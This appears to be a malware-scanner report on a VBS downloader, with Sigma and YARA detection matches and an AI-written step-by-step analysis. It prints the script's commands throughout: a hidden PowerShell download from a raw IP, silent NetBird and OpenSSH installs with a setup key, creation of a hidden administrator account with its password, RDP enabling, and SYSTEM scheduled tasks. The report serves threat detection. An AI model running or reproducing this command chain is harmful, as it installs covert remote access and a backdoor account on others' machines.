threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.

strings: sc.exe config TermService start= auto; net start TermService
wmic UserAccount where Name=\'user\' set PasswordExpires=False
schtasks /create /tn \'Start Netbird\' /tr \'net start netbird\' /sc onstart /ru SYSTEM /f
powershell -NoP -W Hidden -C Start-Process -FilePath \'C:\\Program Files\\Netbird\\netbird.exe\' -ArgumentList \'up --setup-key E48E4A70-4CF4-4A77-946B-C8E50A60855A\' -WindowStyle Hidden
11. Delete Netbird shortcut from all users
sc.exe config netbird start= auto; net start netbird
sc.exe config sshd start= auto; net start sshd;

crowdsourced_yara_results.description: Detects suspicious PowerShell code that downloads from web sites
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

attributes.magic: ASCII text, with CRLF line terminators

sigma_analysis_results.rule_title: Reg Add Suspicious Paths
sigma_analysis_results.rule_description: Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys

match_context.values: @{CommandLine=C:\Windows\system32\reg.exe add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /t REG_DWORD /f /d 0 /v user; Image=C:\Windows\system32\reg.exe; EventID=1}

sigma_analysis_results.rule_title: Script Interpreter Execution From Suspicious Folder
sigma_analysis_results.rule_description: Detects a suspicious script execution in temporary folders or folders accessible by environment variables
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{CommandLine=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -C Remove-Item -Path 'C:\Users\Public\Desktop\Netbird.lnk' -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'C:\Users\*\Desktop\Netbird.lnk' -Force -ErrorAction SilentlyContinue; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

sigma_analysis_results.rule_title: Schtasks Creation Or Modification With SYSTEM Privileges
sigma_analysis_results.rule_description: Detects the creation or update of a scheduled task to run with "NT AUTHORITY\SYSTEM" privileges

match_context.values: @{CommandLine=C:\Windows\system32\schtasks.exe /create /tn Start Netbird /tr net start netbird /sc onstart /ru SYSTEM /f; Image=C:\Windows\system32\schtasks.exe; EventID=1}

sigma_analysis_results.rule_title: Suspicious PowerShell Download and Execute Pattern
sigma_analysis_results.rule_description: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)

match_context.values: @{CommandLine=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -C (New-Object System.Net.WebClient).DownloadFile('http://198.46.178.135/34564/files/001', 'C:\bin\trm'); Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

sigma_analysis_results.rule_title: PowerShell DownloadFile
sigma_analysis_results.rule_description: Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line

match_context.values: @{Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\System32\WScript.exe "C:\Users\Bruno\Desktop\cis.vbs"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -C "(New-Object System.Net.WebClient).DownloadFile('http://198.46.178.135/34564/files/001', 'C:\bin\trm')"; EventID=1; ParentImage=C:\Windows\System32\wscript.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects suspicious PowerShell download command

match_context.values: @{ScriptBlockText=(New-Object System.Net.WebClient).DownloadFile('http://198.46.178.135/34564/files/001', 'C:\bin\trm'); MessageTotal=1; ScriptBlockId=f0d641a2-ada7-4d47-a05f-0e1e96187fd0; Path=; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_description: Detects a Powershell process that contains download commands in its command line string
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro

match_context.values: @{Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine=C:\Windows\System32\WScript.exe "C:\Users\Bruno\Desktop\cis.vbs"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -C "(New-Object System.Net.WebClient).DownloadFile('http://198.46.178.135/34564/files/001', 'C:\bin\trm')"; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\wscript.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Msiexec Quiet Installation
sigma_analysis_results.rule_description:
Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.
Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)

match_context.values: @{Product=Windows Installer - Unicode; CurrentDirectory=C:\Windows\system32\; OriginalFileName=msiexec.exe; Hashes=SHA1=F3D7FEE4CED78E37F49CE4E38AC681F07BCA6AE0,MD5=302BE4B7434E679769029C8570825CC0,SHA256=5A31EA6A517A065166FAFA01A0AC6A350D0E2DCBA1B6DD4FDB41AE59109568E1,IMPHASH=0990A9500FF8DF93E0E059EE13E7C796; Description=Windows\xae installer; EventID=1; ParentCommandLine=C:\Windows\System32\WScript.exe "C:\Users\Bruno\Desktop\cis.vbs"; CommandLine="C:\Windows\System32\msiexec.exe" /i C:\bin\netbird.msi /qn /norestart; FileVersion=5.0.22621.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\wscript.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\msiexec.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects the addition of a new member to the local administrator group, which could be legitimate activity or a sign of privilege escalation activity

sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

sigma_analysis_results.rule_title: Hiding User Account Via SpecialAccounts Registry Key - CommandLine
sigma_analysis_results.rule_description: Detects changes to the registry key "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" where the value is set to "0" in order to hide user account from being listed on the logon screen.

match_context.values: @{CommandLine=C:\Windows\system32\reg.exe add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /t REG_DWORD /f /d 0 /v user; Image=C:\Windows\system32\reg.exe; EventID=1}

sigma_analysis_results.rule_title: New User Created Via Net.EXE
sigma_analysis_results.rule_description: Identifies the creation of local users via the net.exe command.
sigma_analysis_results.rule_author: Endgame, JHasenbusch (adapted to Sigma for oscd.community)

match_context.values: @{CommandLine=C:\Windows\system32\net.exe user user Bs@202122 /add /y; Image=C:\Windows\system32\net.exe; EventID=1}
@{CommandLine=C:\Windows\system32\net.exe localgroup Administrators user /add; Image=C:\Windows\system32\net.exe; EventID=1}
@{CommandLine=C:\Windows\system32\net.exe localgroup Administrateurs user /add; Image=C:\Windows\system32\net.exe; EventID=1}

sigma_analysis_results.rule_title: RDP Sensitive Settings Changed to Zero
sigma_analysis_results.rule_description:
Detects tampering of RDP Terminal Service/Server sensitive settings.
Such as allowing unauthorized users access to a system via the 'fAllowUnsolicited' or enabling RDP via 'fDenyTSConnections', etc.
sigma_analysis_results.rule_author: Samir Bousseaden, David ANDRE, Roberto Rodriguez @Cyb3rWard0g, Nasreddine Bencherchali

match_context.values: @{EventID=13; EventType=SetValue; Details=DWORD (0x00000000); TargetObject=HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections}

sigma_analysis_results.rule_title: Suspicious Schtasks Schedule Type With High Privileges
sigma_analysis_results.rule_description: Detects scheduled task creations or modification to be run with high privileges on a suspicious schedule type

match_context.values: @{CommandLine=C:\Windows\system32\schtasks.exe /create /tn Start Netbird /tr net start netbird /sc onstart /ru SYSTEM /f; Image=C:\Windows\system32\schtasks.exe; EventID=1}

crowdsourced_ai_results.analysis:
The script begins by creating a WScript.Shell object. It then proceeds through a series of steps:

1.  Downloads a file from a specified URL (`http://198.46.178.135/34564/files/001`) and saves it as `C:\bin\trm`.

2.  Renames `C:\bin\trm` to `C:\bin\trm.zip`, extracts its contents to `C:\bin\`, and overwrites existing files if necessary.

3.  Installs `C:\bin\netbird.msi` and `C:\bin\OpenSSH.msi` silently, without requiring a restart.

4.  Configures the `sshd` and `netbird` services to start automatically and starts them.

5.  Pauses script execution for 60 seconds.

6.  Executes `C:\Program Files\Netbird\netbird.exe` with the argument `up --setup-key E48E4A70-4CF4-4A77-946B-C8E50A60855A` without administrative privileges, in a hidden window.

7.  Creates a new user account named "user" with the password "Bs@202122", adds the user to the local Administrators and Administrateurs groups, and hides the user from the login screen by modifying the registry.

8.  Configures the "user" account's password to never expire using WMIC.

9.  Enables Remote Desktop by modifying the registry, enables the "Remote Desktop" firewall rule, configures the "TermService" service to start automatically, and starts the service.

10. Configures the "netbird" service to start with a delayed start, and creates a scheduled task to start the Netbird service at system startup. Additionally, it creates a scheduled task to restart the netbird service 1 minute after system startup.

11. Removes the "Netbird.lnk" shortcut from the public desktop and all user desktops.

The script employs PowerShell commands throughout for various tasks. The use of "powershell -NoP -W Hidden -C" suggests an attempt to execute these commands without displaying a PowerShell window.
The files `netbird.msi`, `OpenSSH.msi`, and the contents of `trm.zip` which are installed, extracted and executed, respectively, could be potential risks.
